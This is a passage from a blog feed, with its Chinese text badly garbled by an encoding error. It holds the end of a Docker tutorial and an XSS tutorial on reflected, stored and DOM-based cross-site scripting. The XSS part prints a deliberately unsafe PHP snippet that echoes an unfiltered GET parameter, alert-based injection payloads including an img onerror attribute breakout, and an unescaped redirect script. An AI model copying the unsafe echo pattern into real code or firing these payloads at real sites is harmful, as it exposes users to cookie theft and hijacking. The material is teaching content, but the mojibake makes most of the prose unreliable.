<code>nginx</code> ã€ <code>redis</code> ã€ <code>mongo</code> ã€ <code>mysql</code> ã€ <code>httpd</code> ã€ <code>php</code> ã€ <code>tomcat</code>  ç­‰ï¼›ä¹Ÿæœ‰ä¸€äº›æ–¹ä¾¿å¼€å‘ã€æ„å»ºã€è¿è¡Œå„ç§è¯­è¨€åº”ç”¨çš„é•œåƒï¼Œå¦‚ <code>node</code> ã€ <code>openjdk</code> ã€ <code>python</code> ã€ <code>ruby</code> ã€ <code>golang</code>  ç­‰ã€‚å¯ä»¥åœ¨å…¶ä¸­å¯»æ‰¾ä¸€ä¸ªæœ€ç¬¦åˆæˆ‘ä»¬æœ€ç»ˆç›®æ ‡çš„é•œåƒä¸ºåŸºç¡€é•œåƒè¿›è¡Œå®šåˆ¶ã€‚</p><p>å¦‚æœæ²¡æœ‰æ‰¾åˆ°å¯¹åº”æœåŠ¡çš„é•œåƒï¼Œå®˜æ–¹é•œåƒä¸­è¿˜æä¾›äº†ä¸€äº›æ›´ä¸ºåŸºç¡€çš„æ“ä½œç³»ç»Ÿé•œåƒï¼Œå¦‚ <code>ubuntu</code> ã€ <code>debian</code> ã€ <code>centos</code> ã€ <code>fedora</code> ã€ <code>alpine</code>  ç­‰ï¼Œè¿™äº›æ“ä½œç³»ç»Ÿçš„è½¯ä»¶åº“ä¸ºæˆ‘ä»¬æä¾›äº†æ›´å¹¿é˜”çš„æ‰©å±•ç©ºé—´ã€‚</p><p>é™¤äº†é€‰æ‹©ç°æœ‰é•œåƒä¸ºåŸºç¡€é•œåƒå¤–ï¼Œ <code>Docker</code>  è¿˜å­˜åœ¨ä¸€ä¸ªç‰¹æ®Šçš„é•œåƒï¼Œåä¸º  <code>scratch</code> ã€‚è¿™ä¸ªé•œåƒæ˜¯è™šæ‹Ÿçš„æ¦‚å¿µï¼Œå¹¶ä¸å®é™…å­˜åœ¨ï¼Œå®ƒè¡¨ç¤ºä¸€ä¸ªç©ºç™½çš„é•œåƒã€‚</p><div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FROM scratch</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div><blockquote><p>å¦‚æœä½ ä»¥  <code>scratch</code>  ä¸ºåŸºç¡€é•œåƒçš„è¯ï¼Œæ„å‘³ç€ä½ ä¸ä»¥ä»»ä½•é•œåƒä¸ºåŸºç¡€ï¼Œæ¥ä¸‹æ¥æ‰€å†™çš„æŒ‡ä»¤å°†ä½œä¸ºé•œåƒç¬¬ä¸€å±‚å¼€å§‹å­˜åœ¨ã€‚</p></blockquote><p>ä¸ä»¥ä»»ä½•ç³»ç»Ÿä¸ºåŸºç¡€ï¼Œç›´æ¥å°†å¯æ‰§è¡Œæ–‡ä»¶å¤åˆ¶è¿›é•œåƒçš„åšæ³•å¹¶ä¸ç½•è§ï¼Œæ¯”å¦‚ <code>swarm</code> ã€ <code>coreos/etcd</code> ã€‚å¯¹äº Linux ä¸‹é™æ€ç¼–è¯‘çš„ç¨‹åºæ¥è¯´ï¼Œå¹¶ä¸éœ€è¦æœ‰æ“ä½œç³»ç»Ÿæä¾›è¿è¡Œæ—¶æ”¯æŒï¼Œæ‰€éœ€çš„ä¸€åˆ‡åº“éƒ½å·²ç»åœ¨å¯æ‰§è¡Œæ–‡ä»¶é‡Œäº†ï¼Œå› æ­¤ç›´æ¥  <code>FROM scratch</code>  ä¼šè®©é•œåƒä½“ç§¯æ›´åŠ å°å·§ã€‚ä½¿ç”¨ Go è¯­è¨€å¼€å‘çš„åº”ç”¨å¾ˆå¤šä¼šä½¿ç”¨è¿™ç§æ–¹å¼æ¥åˆ¶ä½œé•œåƒï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæœ‰äººè®¤ä¸º  <code>Go</code>  æ˜¯ç‰¹åˆ«é€‚åˆå®¹å™¨å¾®æœåŠ¡æ¶æ„çš„è¯­è¨€çš„åŸå› ä¹‹ä¸€ã€‚</p><h4 id="run-æ‰§è¡Œå‘½ä»¤"><a class="markdownIt-Anchor" href="#run-æ‰§è¡Œå‘½ä»¤">#</a> <strong>RUN æ‰§è¡Œå‘½ä»¤</strong></h4><p><code>RUN</code>  æŒ‡ä»¤æ˜¯ç”¨æ¥æ‰§è¡Œå‘½ä»¤è¡Œå‘½ä»¤çš„ã€‚ç”±äºå‘½ä»¤è¡Œçš„å¼ºå¤§èƒ½åŠ›ï¼Œ <code>RUN</code>  æŒ‡ä»¤åœ¨å®šåˆ¶é•œåƒæ—¶æ˜¯æœ€å¸¸ç”¨çš„æŒ‡ä»¤ä¹‹ä¸€ã€‚å…¶æ ¼å¼æœ‰ä¸¤ç§ï¼š</p><ul><li>*<strong>shell* æ ¼å¼ï¼š <code>RUN &lt;å‘½ä»¤&gt;</code> ï¼Œå°±åƒç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥çš„å‘½ä»¤ä¸€æ ·ã€‚åˆšæ‰å†™çš„  <code>Dockerfile</code>  ä¸­çš„  <code>RUN</code>  æŒ‡ä»¤å°±æ˜¯è¿™ç§æ ¼å¼ã€‚</strong></li></ul><div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN echo &#x27;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&#x27; &gt; /usr/share/nginx/html/index.html</span><br></pre></td></tr></table></figure></div><ul><li>*<strong>exec* æ ¼å¼ï¼š <code>RUN [&quot;å¯æ‰§è¡Œæ–‡ä»¶&quot;, &quot;å‚æ•°1&quot;, &quot;å‚æ•°2&quot;]</code> ï¼Œè¿™æ›´åƒæ˜¯å‡½æ•°è°ƒç”¨ä¸­çš„æ ¼å¼ã€‚</strong></li></ul><h4 id="å…¶ä»–æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#å…¶ä»–æŒ‡ä»¤">#</a> <strong>å…¶ä»–æŒ‡ä»¤</strong>ï¼š</h4><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/Hy4g3sq6nkEbLmQ.png" alt="image.png"></p><h2 id="dockerå…¨æµç¨‹"><a class="markdownIt-Anchor" href="#dockerå…¨æµç¨‹">#</a> Docker å…¨æµç¨‹</h2><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/17/yZoqipkB.png" alt="20200927104919216.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;git&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#git&quot;&gt;#&lt;/a&gt; Git&lt;/h1&gt;
&lt;h2 id=&quot;ç‰ˆæœ¬æ§åˆ¶&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ç‰ˆæœ¬æ§åˆ¶&quot;&gt;#&lt;/a&gt; ç‰ˆæœ¬æ§åˆ¶&lt;/h2&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XSS</title>
    <link href="http://example.com/2024/04/15/XSS/"/>
    <id>http://example.com/2024/04/15/XSS/</id>
    <published>2024-04-15T11:22:43.000Z</published>
    <updated>2024-04-15T15:30:54.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss"><a class="markdownIt-Anchor" href="#xss">#</a> XSS</h1><h2 id="è·¨ç«™è„šæœ¬æ”»å‡»"><a class="markdownIt-Anchor" href="#è·¨ç«™è„šæœ¬æ”»å‡»">#</a> è·¨ç«™è„šæœ¬æ”»å‡»</h2><p>ç½‘ç«™ä¸­åŒ…å«å¤§é‡çš„åŠ¨æ€å†…å®¹ä»¥æé«˜ç”¨æˆ·ä½“éªŒï¼Œæ¯”è¿‡å»è¦å¤æ‚å¾—å¤šã€‚æ‰€è°“åŠ¨æ€å†…å®¹ï¼Œå°±æ˜¯æ ¹æ®ç”¨æˆ·ç¯å¢ƒå’Œéœ€è¦ï¼ŒWeb åº”ç”¨ç¨‹åºèƒ½å¤Ÿè¾“å‡ºç›¸åº”çš„å†…å®¹ã€‚åŠ¨æ€ç«™ç‚¹ä¼šå—åˆ°ä¸€ç§åä¸º â€œè·¨ç«™è„šæœ¬æ”»å‡»â€ï¼ˆCross Site Scriptingï¼Œå®‰å…¨ä¸“å®¶ä»¬é€šå¸¸å°†å…¶ç¼©å†™æˆ XSS, åŸæœ¬åº”å½“æ˜¯ cssï¼Œä½†ä¸ºäº†å’Œå±‚å æ ·å¼è¡¨ï¼ˆCascading Style Sheet,CSSï¼‰æœ‰æ‰€åŒºåˆ†ï¼Œæ•…ç§° XSSï¼Œè€Œé™æ€ç«™ç‚¹åˆ™å®Œå…¨ä¸å—å…¶å½±å“ã€‚XSS çš„è¿è¡ŒåŸç†æ˜¯å°†æ¶æ„çš„ script è„šæœ¬æ’å…¥è¿› html/css/js æ–‡ä»¶å½“ä¸­ï¼Œæ¶æ„æ”»å‡»è€…ä¼šåœ¨ Web é¡µé¢é‡Œæ’å…¥æ¶æ„ Script ä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­ Web é‡Œé¢çš„ Script ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚</p><p>è·¨ç«™è„šæœ¬æ”»å‡»æ˜¯ä¸€ç§é’ˆå¯¹ç½‘ç«™åº”ç”¨ç¨‹åºçš„å®‰å…¨æ¼æ´æ”»å‡»æŠ€æœ¯ï¼Œæ˜¯ä»£ç æ³¨å…¥çš„ä¸€ç§ã€‚å®ƒå…è®¸æ¶æ„ç”¨æˆ·å°†ä»£ç æ³¨å…¥ç½‘é¡µï¼Œå…¶ä»–ç”¨æˆ·åœ¨æµè§ˆç½‘é¡µæ—¶ä¼šå—åˆ°å½±å“ï¼Œæ¶æ„ç”¨æˆ·åˆ©ç”¨ xss ä»£ç æ”»å‡»æˆåŠŸåï¼Œå¯èƒ½å¾—åˆ°å¾ˆé«˜çš„æƒé™ã€ç§å¯†ç½‘é¡µå†…å®¹ã€ä¼šè¯å’Œ cookie ç­‰å„ç§å†…å®¹</p><p>æ”»å‡»è€…åˆ©ç”¨ XSS æ¼æ´æ—è·¯æ‰è®¿é—®æ§åˆ¶ â€”â€” ä¾‹å¦‚åŒæºç­–ç•¥ (same origin policy)ã€‚è¿™ç§ç±»å‹çš„æ¼æ´ç”±äºè¢«é»‘å®¢ç”¨æ¥ç¼–å†™å±å®³æ€§æ›´å¤§çš„ç½‘ç»œé’“é±¼ (Phishing) æ”»å‡»è€Œå˜å¾—å¹¿ä¸ºäººçŸ¥ã€‚å¯¹äºè·¨ç«™è„šæœ¬æ”»å‡»ï¼Œé»‘å®¢ç•Œå…±è¯†æ˜¯ï¼šè·¨ç«™è„šæœ¬æ”»å‡»æ˜¯æ–°å‹çš„ â€œç¼“å†²åŒºæº¢å‡ºæ”»å‡»â€ï¼Œè€Œ JavaScript æ˜¯æ–°å‹çš„ â€œShellCodeâ€ã€‚</p><p>xss æ¼æ´é€šå¸¸æ˜¯é€šè¿‡ php çš„è¾“å‡ºå‡½æ•°å°† javascript ä»£ç è¾“å‡ºåˆ° html é¡µé¢ä¸­ï¼Œé€šè¿‡ç”¨æˆ·æœ¬åœ°æµè§ˆå™¨æ‰§è¡Œçš„ï¼Œæ‰€ä»¥ xss æ¼æ´å…³é”®å°±æ˜¯<strong>å¯»æ‰¾å‚æ•°æœªè¿‡æ»¤çš„è¾“å‡ºå‡½æ•°ã€‚</strong></p><p>ä¾‹å¦‚ä»¥ä¸‹ä»£ç ï¼š</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>ä»£ç æœªå¯¹å¯æ§åˆ¶å‚æ•°åšä»»ä½•è¿‡æ»¤ï¼Œæ­¤æ—¶å°±å¯ä»¥åˆ©ç”¨ x æ„å»ºæ¶æ„ js ä»£ç è·å–ä¸€å®šçš„ä¿¡æ¯ï¼Œæµ‹è¯•ä¸€ä¸‹ <code>?x=&lt;script&gt;alert(1)&lt;script&gt;</code></p><p>æ­¤æ—¶æ˜¯é¡µé¢ä¼šå¼¹å‡º <code>1</code> ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/sXjQ6w35zbWBAut.png" alt="image.png"></p><p>xss æ¼æ´ä¸€èˆ¬æ˜¯åœ¨å‰ç«¯ï¼Œå¯¹ç”¨æˆ·è¾“å…¥çš„å†…å®¹ç¼ºå°‘è¿‡æ»¤ï¼Œå½“ç”¨æˆ·æ„é€ æ¶æ„çš„ script è¯­å¥æ—¶ï¼Œå°±æœ‰å¯èƒ½æ³„éœ²ä¿¡æ¯ï¼Œç”¨æˆ·å¯ä»¥åˆ©ç”¨ php ä¸­çš„è¾“å‡ºå‡½æ•°ï¼ˆå¸¸è§çš„è¾“å‡ºå‡½æ•°æœ‰ï¼š <code>print</code> ã€ <code>print_r</code> ã€ <code>echo</code> ã€ <code>printf</code> ã€ <code>sprintf</code> ã€ <code>die</code> ã€ <code>var_dump</code> ã€ <code>var_export</code> ï¼‰æ¥è·å–æ•æ„Ÿä¿¡æ¯</p><p>å±å®³å½±å“ï¼š</p><blockquote><ul><li>ç›—å–å„ç±»ç”¨æˆ·å¸å·ï¼Œå¦‚æœºå™¨ç™»å½•å¸å·ã€ç”¨æˆ·ç½‘é“¶å¸å·ã€å„ç±»ç®¡ç†å‘˜å¸å·</li><li>æ§åˆ¶ä¼ä¸šæ•°æ®ï¼ŒåŒ…æ‹¬è¯»å–ã€ç¯¡æ”¹ã€æ·»åŠ ã€åˆ é™¤ä¼ä¸šæ•æ„Ÿæ•°æ®çš„èƒ½åŠ›</li><li>ç›—çªƒä¼ä¸šé‡è¦çš„å…·æœ‰å•†ä¸šä»·å€¼çš„èµ„æ–™</li><li>éæ³•è½¬è´¦</li><li>å¼ºåˆ¶å‘é€ç”µå­é‚®ä»¶</li><li>ç½‘ç«™æŒ‚é©¬</li><li>æ§åˆ¶å—å®³è€…æœºå™¨å‘å…¶å®ƒç½‘ç«™å‘èµ·æ”»å‡»</li></ul></blockquote><p>å…¶å®å½’æ ¹ç»“åº•ï¼ŒXSS çš„æ”»å‡»æ–¹å¼å°±æ˜¯æƒ³åŠæ³• â€œæ•™å”†â€ ç”¨æˆ·çš„æµè§ˆå™¨å»æ‰§è¡Œä¸€äº›è¿™ä¸ªç½‘é¡µä¸­åŸæœ¬ä¸å­˜åœ¨çš„å‰ç«¯ä»£ç ã€‚å¯é—®é¢˜åœ¨äºå°½ç®¡ä¸€ä¸ªä¿¡æ¯æ¡†çªç„¶å¼¹å‡ºæ¥å¹¶ä¸æ€ä¹ˆå‹å¥½ï¼Œä½†ä¹Ÿä¸è‡³äºä¼šé€ æˆä»€ä¹ˆçœŸå®ä¼¤å®³å•Šã€‚çš„ç¡®å¦‚æ­¤ï¼Œä½†è¦è¯´æ˜çš„æ˜¯ï¼Œè¿™é‡Œæ‹¿ä¿¡æ¯æ¡†è¯´äº‹ä»…ä»…æ˜¯ä¸ºäº†ä¸¾ä¸ªæ —å­ï¼ŒçœŸæ­£çš„é»‘å®¢æ”»å‡»åœ¨ XSS ä¸­é™¤éæ¶ä½œå‰§ï¼Œä¸ç„¶æ˜¯ä¸ä¼šåœ¨æ¶æ„æ¤å…¥ä»£ç ä¸­å†™ä¸Š alert (â€œsay somethingâ€) çš„ã€‚åœ¨çœŸæ­£çš„åº”ç”¨ä¸­ï¼ŒXSS æ”»å‡»å¯ä»¥å¹²çš„äº‹æƒ…è¿˜æœ‰å¾ˆå¤š</p><p><strong>1. çªƒå–ç½‘é¡µæµè§ˆä¸­çš„ cookie å€¼</strong></p><p>åœ¨ç½‘é¡µæµè§ˆä¸­æˆ‘ä»¬å¸¸å¸¸æ¶‰åŠåˆ°ç”¨æˆ·ç™»å½•ï¼Œç™»å½•å®Œæ¯•ä¹‹åæœåŠ¡ç«¯ä¼šè¿”å›ä¸€ä¸ª cookie å€¼ã€‚è¿™ä¸ª cookie å€¼ç›¸å½“äºä¸€ä¸ªä»¤ç‰Œï¼Œæ‹¿ç€è¿™å¼ ä»¤ç‰Œå°±ç­‰åŒäºè¯æ˜äº†ä½ æ˜¯æŸä¸ªç”¨æˆ·ã€‚å¦‚æœä½ çš„ cookie å€¼è¢«çªƒå–ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¾ˆå¯èƒ½èƒ½å¤Ÿç›´æ¥åˆ©ç”¨ä½ çš„è¿™å¼ ä»¤ç‰Œä¸ç”¨å¯†ç å°±ç™»å½•ä½ çš„è´¦æˆ·ã€‚å¦‚æœæƒ³è¦é€šè¿‡ script è„šæœ¬è·å¾—å½“å‰é¡µé¢çš„ cookie å€¼ï¼Œé€šå¸¸ä¼šç”¨åˆ° cookie</p><p><strong>2. åŠ«æŒæµé‡å®ç°æ¶æ„è·³è½¬</strong></p><p>è¿™ä¸ªå¾ˆç®€å•ï¼Œå°±æ˜¯åœ¨ç½‘é¡µä¸­æƒ³åŠæ³•æ’å…¥ä¸€å¥åƒè¿™æ ·çš„è¯­å¥ï¼š <script>window.location.href=â€œ<a class="link"   href="http://www.baidu.com" >http://www.baidu.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>â€;</script>é‚£ä¹ˆæ‰€è®¿é—®çš„ç½‘ç«™å°±ä¼šè¢«è·³è½¬åˆ°ç™¾åº¦çš„é¦–é¡µã€‚æ—©åœ¨ 2011 å¹´æ–°æµªå°±æ›¾çˆ†å‡ºè¿‡ä¸¥é‡çš„ xss æ¼æ´ï¼Œå¯¼è‡´å¤§é‡ç”¨æˆ·è‡ªåŠ¨å…³æ³¨æŸä¸ªå¾®åšå·å¹¶è‡ªåŠ¨è½¬å‘æŸæ¡å¾®åšã€‚</p><p>å¸¸å‡ºç°åœºæ™¯ï¼šæ–‡ç« å‘è¡¨ã€è¯„è®ºã€ç•™è¨€ã€æ³¨å†Œèµ„æ–™çš„åœ°æ–¹ã€ä¿®æ”¹èµ„æ–™çš„åœ°æ–¹ç­‰</p><p>XSS å¯ä»¥åˆ†ä¸ºåå°„å‹ã€å­˜å‚¨å‹ã€DOM å‹</p><h3 id="åå°„å‹xss"><a class="markdownIt-Anchor" href="#åå°„å‹xss">#</a> åå°„å‹ XSS</h3><p>éæŒä¹…åŒ–</p><p>ï¼ˆ1ï¼‰åŸç†<br>â€ƒâ€ƒåå°„å‹ xss åˆç§°éæŒä¹…å‹ xssï¼Œæ˜¯ç›®å‰æœ€æ™®éçš„ç±»å‹ï¼Œè¿™ç§æ”»å‡»æ–¹å¼å¾€å¾€å…·æœ‰ä¸€æ¬¡æ€§ï¼Œå±å®³ç›¸å¯¹è¾ƒå°ï¼Œä½†æ˜¯æ–¹ä¾¿æ”»å‡»è€…æ„é€ ã€‚å‘å‡ºè¯·æ±‚æ—¶ï¼ŒXSS ä»£ç å‡ºç°åœ¨ URL ä¸­ï¼Œä½œä¸ºè¾“å…¥æäº¤åˆ°æœåŠ¡å™¨ç«¯ï¼ŒæœåŠ¡å™¨ç«¯è§£æåå“åº”ï¼ŒXSS ä»£ç éšå“åº”å†…å®¹ä¸€èµ·ä¼ å›ç»™æµè§ˆå™¨ï¼Œæœ€åæµè§ˆå™¨è§£ææ‰§è¡Œ XSS ä»£ç ã€‚è¿™ä¸ªè¿‡ç¨‹åƒä¸€æ¬¡åå°„ï¼Œæ‰€ä»¥ç§°åå°„å‹ XSSã€‚</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/HRqcBeglPQzE4hF.png" alt="image.png"></p><p>ï¼ˆ2ï¼‰æ”»å‡»æ–¹å¼<br>â€ƒâ€ƒæ”»å‡»è€…é€šè¿‡ç”µå­é‚®ä»¶ç­‰æ–¹å¼å°†åŒ…å« xss ä»£ç çš„æ¶æ„é“¾æ¥å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚å½“ç›®æ ‡ç”¨æˆ·è®¿é—®è¯¥é“¾æ¥æ—¶ï¼ŒæœåŠ¡å™¨æ¥å—è¯¥ç”¨æˆ·çš„è¯·æ±‚å¹¶è¿›è¡Œå¤„ç†ï¼Œç„¶åæœåŠ¡å™¨æŠŠå¸¦æœ‰ xss ä»£ç çš„æ•°æ®å‘é€ç»™ç›®æ ‡ç”¨æˆ·çš„æµè§ˆå™¨ï¼Œæµè§ˆå™¨è§£æè¿™æ®µå¸¦æœ‰ xss ä»£ç çš„æ¶æ„è„šæœ¬åå°±ä¼šè§¦å‘ xss æ¼æ´</p><p>åœ¨åˆ¤æ–­æ˜¯å¦æœ‰èƒ½åˆ©ç”¨çš„ XSS æ—¶ï¼Œä¸€èˆ¬éœ€è¦åˆ¤æ–­ç½‘ç«™è¿‡æ»¤äº†ä»€ä¹ˆå­—ç¬¦ï¼Œç„¶åè¿›è¡Œä»£ç æ³¨å…¥ï¼š<br>é¢å¯¹è¾“å…¥æ¡†ï¼Œå…ˆè¾“å…¥ <code>1</code> :</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/JTeYCBVtnUSkmau.png" alt="image.png"></p><p>ç„¶åæŸ¥çœ‹æºä»£ç ï¼Œæ‰¾åˆ°è¾“å…¥çš„ <code>1</code>  å‡ºç°åœ¨ä»€ä¹ˆåœ°æ–¹ï¼š<br><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/FkWQ7DNZUM1KVHA.png" alt="image.png"></p><p>æ’å…¥ä»£ç ï¼š <code>&quot;&gt;&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/xBlZRjIoMrLXdSp.png" alt="image.png"></p><p>æ³¨å…¥æˆåŠŸï¼›</p><p><code>&quot;&gt;&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code>  ä¸­ <code>&quot;&gt;</code>  é—­åˆäº†å‰é¢çš„è¯­å¥ï¼Œåé¢ <code>&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code>  æ˜¯å®é™…åˆ©ç”¨æ¼æ´è¾¾åˆ°ç›®çš„çš„è¯­å¥</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/Djbq3zoIdWvgwyY.png" alt="image.png"></p><h3 id="å­˜å‚¨å‹xss"><a class="markdownIt-Anchor" href="#å­˜å‚¨å‹xss">#</a> å­˜å‚¨å‹ XSS</h3><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/v8CzH1lJwTtGfe7.png" alt="image.png"></p><p>ï¼ˆ1ï¼‰åŸç†<br>â€ƒâ€ƒå­˜å‚¨å‹ XSS å’Œåå°„å‹ XSS çš„å·®åˆ«ä»…åœ¨äºï¼Œæäº¤çš„ä»£ç ä¼šå­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼ˆæ•°æ®åº“ã€å†…å­˜ã€æ–‡ä»¶ç³»ç»Ÿç­‰ï¼‰ï¼Œä¸‹æ¬¡è¯·æ±‚ç›®æ ‡é¡µé¢æ—¶ä¸ç”¨å†æäº¤ XSS ä»£ç ï¼Œä¼šé•¿æœŸå­˜åœ¨å¹¶æœ‰æ•ˆã€‚æœ€å…¸å‹çš„ä¾‹å­å°±æ˜¯ç•™è¨€æ¿ XSSï¼Œç”¨æˆ·æäº¤ä¸€æ¡åŒ…å« XSS ä»£ç çš„ç•™è¨€å­˜å‚¨åˆ°æ•°æ®åº“ï¼Œç›®æ ‡ç”¨æˆ·æŸ¥çœ‹ç•™è¨€æ¿æ—¶ï¼Œé‚£äº›ç•™è¨€å°±ä¼šä»æ•°æ®åº“ä¸­åŠ è½½å‡ºæ¥å¹¶æ˜¾ç¤ºï¼Œäºæ˜¯è§¦å‘äº† XSS æ”»å‡»</p><p>ï¼ˆ2ï¼‰æ”»å‡»æ–¹å¼<br>â€ƒâ€ƒè¿™ç§æ”»å‡»å¤šè§äºè®ºå›ã€åšå®¢å’Œç•™è¨€æ¿ä¸­ï¼Œæ”»å‡»è€…åœ¨å‘å¸–çš„è¿‡ç¨‹ä¸­ï¼Œå°†æ¶æ„è„šæœ¬è¿åŒæ­£å¸¸çš„ä¿¡æ¯ä¸€èµ·æ³¨å…¥å¸–å­çš„å†…å®¹ä¸­ã€‚éšç€å¸–å­è¢«æœåŠ¡å™¨å­˜å‚¨ä¸‹æ¥ï¼Œæ¶æ„è„šæœ¬ä¹Ÿæ°¸ä¹…çš„å­˜æ”¾åœ¨æœåŠ¡å™¨çš„åç«¯å­˜å‚¨å™¨ä¸­ã€‚å½“å…¶ä»–ç”¨æˆ·æµè§ˆè¿™ä¸ªè¢«æ³¨å…¥äº†æ¶æ„è„šæœ¬çš„å¸–å­æ—¶ï¼Œæ¶æ„è„šæœ¬ä¼šåœ¨å®ƒä»¬çš„æµè§ˆå™¨ä¸­å¾—åˆ°æ‰§è¡Œ</p><h3 id="domå‹xss"><a class="markdownIt-Anchor" href="#domå‹xss">#</a> DOM å‹ XSS</h3><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/djA6KrPy3e4OtcU.png" alt="image.png"></p><p>ï¼ˆ1ï¼‰åŸç†<br>â€ƒâ€ƒæ–‡æ¡£å¯¹è±¡æ¨¡å‹ Document Object Modelï¼ˆDOMï¼‰æ˜¯ä¸€ä¸ªä¸å¹³å°ã€ç¼–ç¨‹è¯­è¨€ä¸ç›¸å¹²çš„æ¥å£ï¼Œå…è®¸ç¨‹åºæˆ–è„šæœ¬åŠ¨æ€åœ°è®¿é—®å’Œæ›´æ–°æ–‡æ¡£å†…å®¹ã€ç»“æ„å’Œæ ·å¼ï¼Œå¤„ç†åçš„ç»“æœä¼šæˆä¸ºå±•ç¤ºé¡µé¢çš„ä¸€éƒ¨åˆ†</p><p>DOM å‹ xss å…¶å®æ˜¯ä¸€ç§ç‰¹æ®Šç±»å‹çš„åå°„å‹ xssï¼Œä¹Ÿè¢«ç§°ä½œæœ¬åœ°è·¨ç«™ï¼Œå®ƒæ˜¯åŸºäº DOM æ–‡æ¡£å¯¹è±¡æ¨¡å‹çš„ä¸€ç§æ¼æ´ã€‚DOM XSS å’Œåå°„å‹ XSSã€å­˜å‚¨å‹ XSS çš„åŒºåˆ«åœ¨äº DOM XSS ä»£ç å¹¶ä¸éœ€è¦æœåŠ¡å™¨å‚ä¸ï¼Œå‡ºå‘ XSS é çš„æ˜¯æµè§ˆå™¨çš„ DOM è§£æï¼Œå®Œå…¨æ˜¯å®¢æˆ·ç«¯çš„äº‹æƒ…</p><p>DOM ä¸­æœ‰å¾ˆå¤šå¯¹è±¡ï¼Œå…¶ä¸­ä¸€äº›å¯¹è±¡å¯ä»¥è¢«ç”¨æˆ·æ‰€æ“çºµï¼Œå¦‚ urlï¼Œlocation ç­‰ã€‚å®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥é€šè¿‡ DOM æ¥åŠ¨æ€åœ°æ£€æŸ¥å’Œä¿®æ”¹é¡µé¢å†…å®¹ï¼Œå®ƒä¸ä¾èµ–äºæäº¤æ•°æ®åˆ°æœåŠ¡å™¨ç«¯ï¼Œè€Œæ˜¯ä»å®¢æˆ·ç«¯å–å¾— DOM ä¸­çš„æ•°æ®åå¹¶åœ¨æœ¬åœ°æ‰§è¡Œï¼Œå› æ­¤ä»…ä»æœåŠ¡å™¨ç«¯æ˜¯æ²¡æœ‰åŠæ³•é˜²å¾¡ DOM å‹ XSS æ¼æ´çš„ï¼Œå¦‚è‹¥ DOM ä¸­çš„æ•°æ®æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„éªŒè¯ï¼Œä¾¿ä¼šäº§ç”ŸåŸºäº DOM çš„ XSS æ¼æ´ã€‚</p><p>åŸºäº DOM çš„ XSS æ˜¯åå°„çš„ç‰¹ä¾‹ï¼Œå…¶ä¸­ JavaScript éšè—åœ¨ URL ä¸­ï¼Œå¹¶åœ¨å…¶å‘ˆç°æ—¶ç”±é¡µé¢ä¸­çš„ JavaScript å–å‡ºï¼Œè€Œä¸æ˜¯åœ¨æä¾›æœåŠ¡æ—¶åµŒå…¥åˆ°é¡µé¢ä¸­ã€‚è¿™å¯ä»¥ä½¿å…¶æ¯”å…¶ä»–æ”»å‡»æ›´éšè”½ï¼Œå¹¶ä¸”ç›‘æ§é¡µé¢æ­£æ–‡çš„ WAF æˆ–å…¶ä»–é˜²æŠ¤æ£€æµ‹ä¸å‡ºæ¶æ„å†…å®¹ã€‚</p><p>ï¼ˆ2ï¼‰æ”»å‡»æ–¹å¼<br>â€ƒâ€ƒç”¨æˆ·è¯·æ±‚ä¸€ä¸ªç»è¿‡ä¸“é—¨è®¾è®¡çš„ URLï¼Œå®ƒç”±æ”»å‡»è€…æäº¤ï¼Œè€Œä¸”å…¶ä¸­åŒ…å« xss ä»£ç 